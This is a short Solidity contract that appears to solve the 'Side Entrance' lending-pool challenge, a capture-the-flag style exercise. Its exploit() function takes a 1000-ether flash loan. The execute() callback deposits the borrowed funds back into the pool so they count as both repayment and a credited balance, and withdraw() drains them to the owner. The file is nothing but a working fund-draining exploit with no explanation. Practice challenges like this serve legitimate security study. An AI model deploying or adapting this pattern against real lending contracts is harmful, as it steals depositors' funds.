//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract sideenter{

    SideEntranceLenderPool si;
    address owner;
    constructor(address s){
        si = SideEntranceLenderPool(s);
        owner = msg.sender;
    }

    function execute() public payable{
        si.deposit{value:address(this).balance}();

    }

    function exploit() public {
        si.flashLoan(1000 ether);
    }

    function withdraw() public payable{
        si.withdraw();
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}

}